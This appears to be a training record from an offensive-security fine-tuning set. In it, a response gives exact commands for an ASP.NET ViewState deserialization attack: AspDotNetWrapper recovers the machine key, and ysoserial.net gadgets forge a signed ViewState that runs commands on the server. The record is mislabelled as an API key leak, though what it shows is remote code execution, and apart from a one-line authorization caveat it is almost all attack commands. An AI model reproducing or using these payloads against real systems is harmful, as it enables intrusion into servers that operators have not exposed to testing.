# SECRETS — web_offensive_elite_v2_sft

- source: web_offensive_elite_v2_sft
- class: secrets
- cwe: CWE-312

## Scenario

Show me how MAC Is Enabled And Encryption Is Disabled works in the context of API Key Leaks, including the exact payloads/commands.

## Analysis / Response

**MAC Is Enabled And Encryption Is Disabled** — this technique applies to API Key Leaks. Use the following only against systems you are explicitly authorized to test. Here is the approach along with the concrete payloads from the reference:

* Find the machine key (validationkey) using `badsecrets`, `viewstalker`, `AspDotNetWrapper.exe` or `viewgen`

    ```ps1
    AspDotNetWrapper.exe --keypath MachineKeys.txt --encrypteddata /wEPDwUKLTkyMTY0MDUxMg9kFgICAw8WAh4HZW5jdHlwZQUTbXVsdGlwYXJ0L2Zvcm0tZGF0YWRkbdrqZ4p5EfFa9GPqKfSQRGANwLs= --purpose=viewstate  --valalgo=sha1 --decalgo=aes --modifier=CA0B0334 --macdecode --legacy
    # --modifier = `__VIEWSTATEGENERATOR` parameter value
    # --encrypteddata = `__VIEWSTATE` parameter value of the target application
    ```

* Then generate a ViewState using [pwntester/ysoserial.net](https://github.com/pwntester/ysoserial.net), both `TextFormattingRunProperties` and `TypeConfuseDelegate` gadgets can be used.

    ```ps1
    .\ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "cmd /c whoami" --generator=CA0B0334 --validationalg="SHA1" --validationkey="C551753B0325187D1759B4FB055B44F7C5077B016C02AF674E8DE69351B69FEFD045A267308AA2DAB81B69919402D7886A6E986473EEEC9556A9003357F5ED45"
    .\ysoserial.exe -p ViewState -g TypeConfuseDelegate -c "cmd /c whoami" --generator=3E92B2D6 --validationalg="SHA1" --validationkey="C551753B0325187D1759B4FB055B44F7C5077B016C02AF674E8DE69351B69FEFD045A267308AA2DAB81B69919402D7886A6E986473EEEC9556A9003357F5ED45"

    # --generator = `__VIEWSTATEGENERATOR` parameter value
    # --validationkey = validation key from the previous command
    ```
